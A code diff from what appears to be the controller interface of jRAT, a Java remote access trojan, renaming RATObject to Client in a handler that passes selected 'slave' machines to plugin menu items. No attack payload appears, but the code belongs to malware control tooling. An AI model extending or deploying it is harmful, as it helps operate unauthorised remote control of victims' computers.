@@ -27,7 +27,8 @@ import javax.swing.event.PopupMenuEvent;
 import javax.swing.event.PopupMenuListener;
 import javax.swing.table.DefaultTableModel;
 
-import jrat.api.RATObject;
+import jrat.api.Client;
+import jrat.api.Client;
 import jrat.api.ui.RATMenuItem;
 import se.jrat.common.downloadable.Downloadable;
 import se.jrat.common.utils.DataUnits;
@@ -35,7 +36,7 @@ import se.jrat.controller.AbstractSlave;
 import se.jrat.controller.Main;
 import se.jrat.controller.Slave;
 import se.jrat.controller.Status;
-import se.jrat.controller.addons.RATObjectFormat;
+import se.jrat.controller.addons.ClientFormat;
 import se.jrat.controller.listeners.CountryMenuItemListener;
 import se.jrat.controller.net.URLParser;
 import se.jrat.controller.packets.outgoing.Packet100RequestElevation;
@@ -890,9 +891,9 @@ public class PanelMainClients extends JScrollPane {
 			item.addActionListener(new ActionListener() {
 				public void actionPerformed(ActionEvent e) {
 					List<AbstractSlave> list = getSelectedSlaves();
-					List<RATObject> servers = new ArrayList<RATObject>();
+					List<Client> servers = new ArrayList<Client>();
 					for (int i = 0; i < list.size(); i++) {
-						servers.add(RATObjectFormat.format(list.get(i)));
+						servers.add(ClientFormat.format(list.get(i)));
 					}
 
 					ritem.getListener().onClick(servers);
